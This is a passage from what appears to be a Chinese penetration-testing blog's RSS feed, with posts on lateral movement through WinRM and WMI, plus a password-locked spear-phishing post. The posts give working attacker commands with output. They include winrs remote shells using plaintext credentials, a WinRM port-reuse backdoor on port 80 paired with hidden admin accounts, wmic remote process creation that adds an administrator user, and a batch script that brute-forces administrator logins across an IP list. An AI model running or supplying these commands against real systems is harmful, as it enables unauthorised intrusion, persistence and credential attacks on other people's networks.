class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Administrator&gt; <span class="built_in">Get-WmiObject</span> <span class="literal">-Class</span> win32_service | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.name <span class="operator">-like</span> <span class="string">&quot;WinRM&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">ExitCode  : <span class="number">0</span></span><br><span class="line">Name      : WinRM</span><br><span class="line">ProcessId : <span class="number">1128</span></span><br><span class="line">StartMode : Auto</span><br><span class="line">State     : Running</span><br><span class="line">Status    : OK</span><br></pre></td></tr></table></figure><h3 id="服务端防火墙允许WinRM服务端口通信"><a href="#服务端防火墙允许WinRM服务端口通信" class="headerlink" title="服务端防火墙允许WinRM服务端口通信"></a>服务端防火墙允许WinRM服务端口通信</h3><p>默认为5985、5986；如果5985打开，但是5986关闭，标识WinRM服务配置为仅接受HTTP连接。修改默认端口可以使用如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm <span class="built_in">set</span> winrm/config/Listener?Address=*+Transport=HTTP <span class="selector-tag">@</span>&#123;Port=<span class="string">&quot;80&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="WinRM通信两端配置要求"><a href="#WinRM通信两端配置要求" class="headerlink" title="WinRM通信两端配置要求"></a>WinRM通信两端配置要求</h3><p>1）查看WinRM具体配置</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm get winrm/config</span><br></pre></td></tr></table></figure><p>2）允许所有客户端IP连接</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm <span class="built_in">set</span> winrm/config/Client <span class="selector-tag">@</span>&#123;TrustedHosts=<span class="string">&quot;*&quot;</span>&#125;</span><br><span class="line">winrm e winrm/config/listener <span class="comment">#查看监听地址和端口</span></span><br></pre></td></tr></table></figure><h2 id="远程管理"><a href="#远程管理" class="headerlink" title="远程管理"></a>远程管理</h2><p>远程连接时可能会遇到以下错误</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Winrs error:WinRM 客户端无法处理该请求。可以在下列条件下将默认身份验证与 IP 地址结合使用: 传输为 HTTPS 或目标位于 TrustedHosts 列表中，并且提供了显式凭据。使用 winrm.cmd 配置 TrustedHosts。请注意，TrustedHosts 列表中的计算机可能未经过身份验证。 有关如何设置 TrustedHosts 的详细信息，请运行以下命令: winrm help config。</span><br><span class="line"></span><br><span class="line">Winrs error:WinRM 客户端无法处理该请求。如果身份验证方案与 Kerberos 不同，或者客户端计算机未加入到域中，则必须使用 HTTPS 传输或者必须将目标计算机添加到 TrustedHosts 配置设置。使用 winrm.cmd 配置 TrustedHosts。请注意，TrustedHosts 列表中的计算机可能未经过身份验证。 通过运行以下命令 可获得有关此内容的更多信息: winrm help config。</span><br></pre></td></tr></table></figure><p>在你的攻击机上执行下面这条命令，设置为信任所有主机，再去连接即可</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;winrm <span class="built_in">set</span> winrm/config/Client <span class="selector-tag">@</span>&#123;TrustedHosts=<span class="string">&quot;*&quot;</span>&#125;</span><br><span class="line"> Client</span><br><span class="line">    NetworkDelayms = <span class="number">5000</span></span><br><span class="line">    URLPrefix = wsman</span><br><span class="line">    AllowUnencrypted = false</span><br><span class="line">    Auth</span><br><span class="line">        Basic = true</span><br><span class="line">        Digest = true</span><br><span class="line">        Kerberos = true</span><br><span class="line">        Negotiate = true</span><br><span class="line">        Certificate = true</span><br><span class="line">        CredSSP = false</span><br><span class="line">    DefaultPorts</span><br><span class="line">        HTTP = <span class="number">5985</span></span><br><span class="line">        HTTPS = <span class="number">5986</span></span><br><span class="line">    TrustedHosts = *</span><br></pre></td></tr></table></figure><h3 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;winrs <span class="literal">-r</span>:<span class="number">192.168</span>.<span class="number">86.114</span> <span class="literal">-u</span>:<span class="number">192.168</span>.<span class="number">86.114</span>\administrator <span class="literal">-p</span>:<span class="number">123456</span>!<span class="selector-tag">@</span><span class="comment">#$% whoami</span></span><br><span class="line">win<span class="literal">-win7</span>\administrator</span><br></pre></td></tr></table></figure><h3 id="获取交互式的shell"><a href="#获取交互式的shell" class="headerlink" title="获取交互式的shell"></a>获取交互式的shell</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;winrs <span class="literal">-r</span>:<span class="number">192.168</span>.<span class="number">86.114</span> <span class="literal">-u</span>:<span class="number">192.168</span>.<span class="number">86.114</span>\administrator <span class="literal">-p</span>:<span class="number">123456</span>!<span class="selector-tag">@</span><span class="comment">#$% cmd</span></span><br><span class="line">Microsoft Windows [版本 <span class="number">6.1</span><span class="type">.7601</span>]</span><br><span class="line">版权所有 (c) <span class="number">2009</span> Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP 配置</span><br><span class="line"></span><br><span class="line">以太网适配器 本地连接:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::<span class="number">95</span>c8:a481:b587:<span class="number">2</span>d7c%<span class="number">11</span></span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : <span class="number">192.168</span>.<span class="number">86.114</span></span><br><span class="line">   子网掩码  . . . . . . . . . . . . : <span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">   默认网关. . . . . . . . . . . . . : <span class="number">192.168</span>.<span class="number">86.1</span></span><br><span class="line"></span><br><span class="line">隧道适配器 isatap.&#123;<span class="number">993</span>CBC2D<span class="literal">-5164</span><span class="literal">-415A</span><span class="literal">-A70E</span><span class="literal">-00FF0F6119D5</span>&#125;:</span><br><span class="line"></span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br></pre></td></tr></table></figure><h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><h4 id="WSMan-WinRM"><a href="#WSMan-WinRM" class="headerlink" title="WSMan-WinRM"></a>WSMan-WinRM</h4><p> 使用WSMan.Automation COM对象通过WinRM执行远程命令。 </p><p> <a href="https://github.com/bohops/WSMan-WinRM">https://github.com/bohops/WSMan-WinRM</a> </p><h4 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h4><table><thead><tr><th align="left">模块功能</th><th align="left">目标端口</th><th align="left">目标系统</th><th align="left">使用教程</th></tr></thead><tbody><tr><td align="left">Winrm爆破</td><td align="left">5985/5986端口</td><td align="left">Windows</td><td align="left"><a href="http://k8gege.org/Ladon/WinrmScan.html">http://k8gege.org/Ladon/WinrmScan.html</a></td></tr></tbody></table><h2 id="其他利用"><a href="#其他利用" class="headerlink" title="其他利用"></a>其他利用</h2><h3 id="开启远程主机3389"><a href="#开启远程主机3389" class="headerlink" title="开启远程主机3389"></a>开启远程主机3389</h3><p>如果目标开启了WinRM可以利用<a href="https://github.com/Viralmaniar/PeekABoo">PeekABoo</a>工具使目标开启3389</p><h3 id="端口复用后门"><a href="#端口复用后门" class="headerlink" title="端口复用后门"></a>端口复用后门</h3><p>将WinRM监听端口由5985改为80或者443，即使端口被web服务也不影响，并且不影响web服务。利用如下</p><p>1）配置目标WinRM服务，更改监听端口开启复用</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm <span class="built_in">set</span> winrm/config/Listener?Address=*+Transport=HTTP <span class="selector-tag">@</span>&#123;Port=<span class="string">&quot;80&quot;</span>&#125;</span><br><span class="line">winrm <span class="built_in">set</span> winrm/config/service <span class="selector-tag">@</span>&#123;EnableCompatibilityHttpListener=<span class="string">&quot;true&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>2）链接目标</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs <span class="literal">-r</span>:<span class="number">192.168</span>.<span class="number">86.114</span> <span class="literal">-u</span>:<span class="number">192.168</span>.<span class="number">86.114</span>\administrator <span class="literal">-p</span>:<span class="number">123456</span>!<span class="selector-tag">@</span><span class="comment">#$% whoami</span></span><br></pre></td></tr></table></figure><p>该方法适用于有web服务的机器，不会开启新的端口，配合添加隐藏管理员用户，隐蔽性极高。</p><h2 id="参考引用："><a href="#参考引用：" class="headerlink" title="参考引用："></a>参考引用：</h2><p> <a href="http://t3ngyu.leanote.com/post/LM-WinRM-WinRS">http://t3ngyu.leanote.com/post/LM-WinRM-WinRS</a></p><p> <a href="https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/">https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/</a></p><p> <a href="https://xz.aliyun.com/t/6888">https://xz.aliyun.com/t/6888</a></p><p> <a href="https://www.cnblogs.com/-mo-/p/12019314.html">https://www.cnblogs.com/-mo-/p/12019314.html</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;基于winRM的横向移动&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="内网渗透" scheme="https://www.se7ensec.cn/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>在线肾透测试中心</title>
    <link href="https://www.se7ensec.cn/2020/08/24/%E8%82%BE%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83/"/>
    <id>https://www.se7ensec.cn/2020/08/24/%E8%82%BE%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83/</id>
    <published>2020-08-24T14:10:24.000Z</published>
    <updated>2020-11-14T19:55:25.730Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>“成就他人是一个伟大得行为，我将贯彻到底。”    ——hl0rey</p></blockquote><a id="more"></a><p>作为天天肾透，日日肾虚的我们，常常需要借助各种各样的在线网站来进行信息收集、加密解密、数据处理…</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.08.24/2.jpg"></p><p>随着浏览器收藏夹分类越来越多，找到网址然后打开得操作越来越觉得麻烦，便花了一些时间来整理了下做成了一个导航页，页面内容不定期会保持更新。</p><p>也不用担心某一类型重复得网站太多，不知道用哪个好，基本上贴上去得我自己全部都使用过，备注 ”推荐“ 的就是用起来感觉不错得。</p><p>个人认为通过在线网站各种功能，完成信息收集60%的工作是完全没问题的，希望可以对看文章的你有所帮助~</p><p>在线工具 - 肾透测试中心 -  <a href="https://gitbook.se7ensec.cn/">https://gitbook.se7ensec.cn/</a> </p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;“成就他人是一个伟大得行为，我将贯彻到底。”    ——hl0rey&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="HTML" scheme="https://www.se7ensec.cn/tags/HTML/"/>
    
  </entry>
  
  <entry>
    <title>鱼叉攻击|使用Lnk文件的另类钓鱼方式</title>
    <link href="https://www.se7ensec.cn/2020/08/22/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB-Lnk%E6%96%87%E4%BB%B6%E7%9A%84%E5%8F%A6%E7%B1%BB%E9%92%93%E9%B1%BC%E6%96%B9%E5%BC%8F/"/>
    <id>https://www.se7ensec.cn/2020/08/22/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB-Lnk%E6%96%87%E4%BB%B6%E7%9A%84%E5%8F%A6%E7%B1%BB%E9%92%93%E9%B1%BC%E6%96%B9%E5%BC%8F/</id>
    <published>2020-08-22T07:10:24.000Z</published>
    <updated>2020-11-14T19:55:57.388Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="b2380840d3793d67b6d9fc04edcfc8d634b1b333d73b8018b76fc3a2791f250b">60a13925d46354e3c1b9aa984b9eaf9066ac7a8ed9b3f8311475aa9b656c0c6cb67fd62584250b5f70e1534e6acd923ed400d8b00febcb6e2af442161de0bfabb7b7a22e8c3d9161dd7027da92ac92fe223b1deb3d800d6d4bec059945898427bf7de58ea0c39595e0ee422c22019309ca3ea54fe9fb113d930f6b0b150249fecb94cb26c74df089102e8c7a3bb8f2dab2c9b01f64c7c394f1e8e377ad2401f86cef116145507c114bb964bc800a340dac05a8b60241783abafcad6737b8f88a55fdd09f4083a05e06df1f0cf8b8c630a63bb7f75ca3df6756f81c889af656bb77856417d7eeea7d73e4fde9414b0353960e0c16fad44752fbe22830cab8aafd510c40b58c233a8ba23f59612192e9c6491721c9c62595662bfd4796dac9abebf7cb19435a7ef6b40fec6eee85c67faf8d3f271efe9a7ef0ce4ccc344a61163bdca2aaba2e895d527fa0978901170d648b1f450f50b25d603f002aeece4be97588a2932879c85e0325690e08bb63add5e1b20049493071cfe90bcf14d13f875c18fab445603380958fb2f376317ad69c6fd4cbc9d33afa7412e63946a495cdf7a417b1990d246e054d278d24c5153f51ff970731b65b4b689410f580570f9f8e3a9f73bec92c0b70bcd49f4433c1e06bd7e5e4edd0c58cf7841682a7ff5111fcbc0a56f67d879229a682b8b60f8bcec11372b169e616c482f079994f53c7b8788677fb1722aa5bb1c698250585031b0c5caa312f98fce68268e563e7de65ad9a79982a94c41fea9289c93766d44d281b428fc45ced665f4a4323d2f733c9072259f06d614074f5876bd73d0b1624420c60ef7686dc02553d1b2c5e18ace329318fceb78d3bc49cbcab3f19949a805e4640ad45f828340e02e697120ffd22c8f92701e654fd33f7a1a111947f18dc5469498fdde9302640c85d3584dbcfc505d5605b766ac57a4c3be045f7ff78194d3cfa69c3be4f48d61840c226451cf7aaa3d3ec02b11a63f8a996658968e399e0e98da2afedb7e0d98719fd4a55e415c99f14b95c172e4dd2fa6656bef00a60bba994f72b5dc5dbac6be7627a740a1f8e713adf9f7ae230fe7ef44b4c27b7ac2553847682d5f7ad5bdd913b1302fe5d15880e789624bfb096f457f01033878ff595c15eaf88c215dd0130023687ae4ae0eace0dfb0ab731a310624b1bd92953fa7f171ff0dd69b26ff31cbaddbaddd3a6f85e63d0c7480e2682da9ef12d87dfa5558358e86d542c62372bdd8b324549a7f432838112e9e1447f3226c6b40b6dd0df179bc480f9d27a95b7e38627d2746160883a4b8a04542491e52b1875a8e71de625d64ccf39cf7100950f1c71caad7a05ada2252bc0beedb270c445308395158317b5b40d71d68c9435a33b64a7b8adddb471a0db5ead48e605630f2d9e10a43b22b61e5ebba00803e8c6473f7cb920af85ffd8a0c1cb55128c2fe6b1d6d3a38eca07650cc00ceebfcd8001177d5b6385e2ffb272faea39b74045025eee12464a925e32d01a2f52cd9aba5c7e75f4b5b0df5a8e5509f2ef01aef1b4573b2526935ed1b75a0764f81bf3d5fc24732d085b93b0a4e4949ecbb86963e7a9d1fa3ba6065caa79f871fa8ce363cffbd92942cb5406fd60a5d6b27e0d5d8140fc153b0e04669ad14ebbf773ddddf23e15193d3090552c0331de91b1651c1a84d3b6c7b1be4aa4b8fe1a283550dccbbd2b8d29e19c02434a0f3fbe53754292635b4ba08f0615721f131dbbfd30850692c0d6680271a3a0e42fa21113dc21d76950b0e5d41182849449621821cd74ed34ca3889dae7ba682405f88fd5f931627e72d37a56ab7cfcdf53d4e00d5341604f1651ae147ee82be71eaa6a387a3f82920d57c1c9b2aa9cd89ab14ae23e6e7cc8bf68827ae4d1e52d51f1a610df11f39ee5a10029394163320310826b229b6f42dacbfa5c515c359681d79d3c7f060d6cfc65c3b2ffd315d9a77a200f476502b70901d88a293b0bb7d9151e8bc41d3afe32bb11865d0099cf62f6bde2faef2c566a6b944fa7bb19563237ef552bded9b25293b154d0cab21d761bd6c293718183bb4b7f73c349bb8aa1674b7ab5777ea7a7d79fab879052ecf2e481bbe2a2fade9de7acb162067538c2b843d926a78aa4c18150c8b1ebfe7d832426ad2e4ed2338c1e58a544bb3a53e4398bb2d0553e145700e2784781fbc0c527754d3ae4ea98620af6e11be7cd79af2937eb647bc2cf6870e29886772e020eb386c3d073351b503066ce0c364bed838e23f9e22ee99896c3ab9bbd7850dc4261709dbec9f6076f74b294d01e2a6b8f4e7e420d4689354459eef7fc9195b664ce687b8bcd7d106973f8e4cc3c937401dd4780a1c7592cd5da9a096eabe4fada8a61760bf7b7b7bc05f7829f07a075a092a3ddc6955ff239d45514ecbceea1d2f469f038d317b03c860225daba43f9d451db8b3920923aa4cf7cf18358dfc1a2317ef6b575234feb2984cb776e68a19b7eb14de2ca26d7ed2152fb1bd56c76825335b5f9606448c959eaf095d391598ef85768f48f475682812ec8ea9a45c64c43da2fddf0b90d2927983ce66472777b94d79da54a0eba87b6157ba7971274662e3e1f3e40d825a46c92653e0ed0e84d90917770b3318635447c0e53114e5c098cd03d4ebe4026946055ddc5db3437da376cf443b2017666f70fed1a8635e1442fe40df2f23d7c70c38d597436a5c98207aff9395cb0150c419cd73e87e38126943e5b370d7ff638d447e30a1084e31dfb1419650428207321bc4669d524e6f41cea124805ec0cbfa06d97a3bd4dc3c92199d765cea6afc88b7adef161bb3dc21e44a97ba1a2d8dcf229431e3082e5d1bdd4492261babaf30a2d3c62a9e390fd3899bc2a2b4bf5be27118b6fe048e4e5199984ea033945ab9dc7e9fc3d710b936b8b47c643b8b84804b531a0ca58871d57e6aebc84c1d7cbf39c440c0d68d258dd81bc011221ed741d2a362b05c1c4479f6c67c959d2388925bab99fb52713ffaef078d7fdc9a72c83ac299679c42d3d2a9d0a65a7fd746a19b2e1145e5662e6e90e35c9f90470b4866098d17a4a68cb93848f7dc56624a550e63c011c79b37f3a7e1172c59a1da9bbb2eda3d10e4043557cb5b159a78a6b2528f43ead9f78636982899146b59f7b4c42c9571dc25192d76dd5cee312937a18c560d0dbf0d53de90d08f533eca6a9b09d9e7ce8c75c666f7d7e4de9599d677bc8416b1e358ca6fc3813a7c0396cb4c7e1ba1fa0f50e58bd5fe56c5a39770355ac25718786c295205872cb1d2515727eef69b7e7444106dfb3cec58c62693720ba52b942079a8c9ce952904b4d9ea21345efe61866923b32e66f4192f30c68247c495cd3f383db0b6ec6f7b16f54eaa18174018e66ec1f3c5757d8df65f9074d3d099ffab1d764cb9c7b32002bbf2aba24e0a71024354dc4376a0cf4081e43387eaeb1ac312382f2cb01d1fa35368755db065fb72e2c739f65c512913661b09709bc90d19125a0bfc0af67517350babd0ee2efda3e4afdc833548885a1241f6a912dc402d519f25559a8ba011bc0a6290fd4e43d2c66e9181c49bef7022dae2f72b81a3f34bc5132624d48444940404af3aa3985262af54637aec2d8d29cb749cefb44f0a9f43a012caf75fc020fb9563ee3a36cbee6a0242d5c101a507ef336a59aec8bf7cbe0c3d7744ab36c4324bb8375555fa35274ff3083283d501ca2ae92d6a62d7a2474598d595e6fbe02fec66437f28ed038a0f99a4921fedc907e3fbe8bd60b54699b2d1c5504eec503c7bddd4233670ccf1b79d2e1bbe2d89f199e144e449fc32648537ad64dd26e7250daba3ef76e6e1fd078189ad1ddf695da380ab4d0a110e996a9e07182c960d1a1a58d47b3224f513bed8fbe5042200ad4566a3111f774795cbe11f66910b480c8e298e6f58db00ce240d08fbdaa3736b298d0c191783701fbfb4710eac46e3d5e387d1eea4b1d9e248aa1da93c5e1e7799776171ca851ab4a9c52ac9ec613fe6f5feec3e5a3b17240ba915ff4591d66719bbd202bfa0c4df6afb1a48fa3a837742b16416c511b4ad30aaa2fb86fc176b96da3723c56a70ffe01a8c6723afb14fd572a99e0d32208a50f030dd8cfcbe03e253794410e93228121724ec106e69e7fff49b750de8029939beb5dc41e54f5e739b69d63d4abff1337d58b81554a8438ec71a082b8c8e4208cc07500653b2d8f945e3602ea6d42ffd3bbdeae7f2a2aa67c69c99cf4f57fac05e5f3ec7c9ab436cd8367</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="鱼叉攻击" scheme="https://www.se7ensec.cn/tags/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透|基于WMI的横向移动</title>
    <link href="https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewmi%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <id>https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewmi%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</id>
    <published>2020-07-12T07:12:24.000Z</published>
    <updated>2020-11-14T19:55:04.354Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>基于WMI的横向移动</p></blockquote><a id="more"></a><h2 id="WMI-介绍"><a href="#WMI-介绍" class="headerlink" title="WMI 介绍"></a>WMI 介绍</h2><p><code>WMI </code>的全称是 <code>Windows Management Instrumentation</code>，它出现在所有的 <code>Windows</code>操作系统中，并由一组强大的工具集合组成，用于管理本地或远程的<code>Windows</code>系统，攻击者使用<code>wmi</code>来进行攻击，但 <code>Windows </code>系统默认不会在日志中记录这些操作，可以做到无日志，攻击脚本无需写入到磁盘，增加了隐蔽性。推荐使用<code>wmic</code>进行远程执行命令。 </p><h2 id="WMI-利用条件"><a href="#WMI-利用条件" class="headerlink" title="WMI 利用条件"></a>WMI 利用条件</h2><p> 远程服务器启动<code>Windows Management Instrumentation</code>服务（默认开启）</p><p> <code>135</code> 端口未被过滤 [<strong>默认配置下目标主机防火墙开启将无法连接</strong>]</p><h2 id="连接失败常见错误号："><a href="#连接失败常见错误号：" class="headerlink" title="连接失败常见错误号："></a>连接失败常见错误号：</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.开启防火墙时，允许共享例外</span><br><span class="line">错误:</span><br><span class="line">代码 = <span class="number">0</span>x800706ba</span><br><span class="line">说明 = RPC 服务器不可用。</span><br><span class="line">设备 = Win32</span><br><span class="line"><span class="number">2</span>.组策略阻止administraotr远程访问时</span><br><span class="line">错误:</span><br><span class="line">代码 = <span class="number">0</span>x80070005</span><br><span class="line">说明 = 拒绝访问。</span><br><span class="line">设备 = Win32</span><br><span class="line"><span class="number">3</span>.IP安全策略阻止<span class="number">135</span>时</span><br><span class="line">错误:</span><br><span class="line">代码 = <span class="number">0</span>x800706ba</span><br><span class="line">说明 = RPC 服务器不可用。</span><br><span class="line">设备 = Win32</span><br><span class="line"><span class="number">4</span>.禁用winmgmt服务时</span><br><span class="line">错误:</span><br><span class="line">代码 = <span class="number">0</span>x80070422</span><br><span class="line">说明 = 无法启动服务，原因可能是已被禁用或与其相关联的设备没有启动。</span><br><span class="line">设备 = Win32</span><br><span class="line"><span class="number">5</span>.拒绝wbem目录权限，无法使用wmic的</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h2 id="利用-wmic-进行横向移动"><a href="#利用-wmic-进行横向移动" class="headerlink" title="利用 wmic 进行横向移动"></a>利用 wmic 进行横向移动</h2><h3 id="常用系统自带命令"><a href="#常用系统自带命令" class="headerlink" title="常用系统自带命令"></a>常用系统自带命令</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.列出远程主机进程</span><br><span class="line">wmic /node:<span class="number">192.168</span>.<span class="number">1.1</span> /user:<span class="number">192.168</span>.<span class="number">1.1</span>\administrator /password:!<span class="selector-tag">@</span><span class="comment">#123QWE process list brief</span></span><br><span class="line"><span class="number">2</span>.在远程系统上执行bat脚本</span><br><span class="line">wmic /node:<span class="number">192.168</span>.<span class="number">1.1</span> /user:<span class="number">192.168</span>.<span class="number">1.1</span>\administrator /password:!<span class="selector-tag">@</span><span class="comment">#123QWE process call create c:\programdata\test.bat</span></span><br><span class="line"><span class="number">3</span>.在远程系统上执行单条命令</span><br><span class="line">wmic /node:<span class="number">192.168</span>.<span class="number">1.1</span> /user:<span class="number">192.168</span>.<span class="number">1.1</span>\administrator /password:!<span class="selector-tag">@</span><span class="comment">#123QWE process call create &quot;cmd.exe /c net user test1 !@#123QWE /add &amp;&amp; net localgroup administrators test1 /add</span></span><br><span class="line"></span><br><span class="line">引用自：https://www.cnblogs.com/<span class="number">0</span>xdd/p/<span class="number">11393392</span>.html</span><br></pre></td></tr></table></figure><h3 id="批量爆破"><a href="#批量爆破" class="headerlink" title="批量爆破"></a>批量爆破</h3><p>wmi的爆破经过实践，错误次数3次以上，360会拦截【无杀软时没有测试】，记录日志为远程rdp爆破，并暂时限制wmi的连接。</p><p>※以下为单密码爆破，有爆破多个密码爆破的需求的话，可以根据ipc横向移动那篇自行修改</p><p><strong>坑点：需注意特殊字符，如密码中有 <code>%</code> 需要用 <code>%</code> 来转义，例 ：<code>123#$%</code> 应转化为 <code>123#$%%</code></strong> </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">cls</span></span><br><span class="line"><span class="built_in">echo</span> Useage: %<span class="number">0</span> ip.txt</span><br><span class="line"><span class="keyword">for</span> /f %%i <span class="keyword">in</span> (%<span class="number">1</span>) <span class="keyword">do</span> (</span><br><span class="line"><span class="built_in">echo</span> wmic /node:%%i /user:<span class="string">&quot;%%i\administrator&quot;</span> /password:<span class="string">&quot;123456&quot;</span> <span class="keyword">process</span> list brief  &gt;&gt; log.txt</span><br><span class="line">wmic /node:%%i /user:<span class="string">&quot;%%i\administrator&quot;</span> /password:<span class="string">&quot;123456&quot;</span> <span class="keyword">process</span> list brief &gt;NUL <span class="number">2</span>&gt;NUL</span><br><span class="line"><span class="keyword">IF</span> errorlevel == <span class="number">0</span> (</span><br><span class="line"><span class="built_in">echo</span> success:%%i &gt;&gt; pic.txt</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">echo</span> <span class="keyword">end</span> &gt;&gt; end.txt</span><br></pre></td></tr></table></figure><h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><h4 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h4><p>没有使用过，暂未测试</p><p><code>wmiexec.vbs</code> 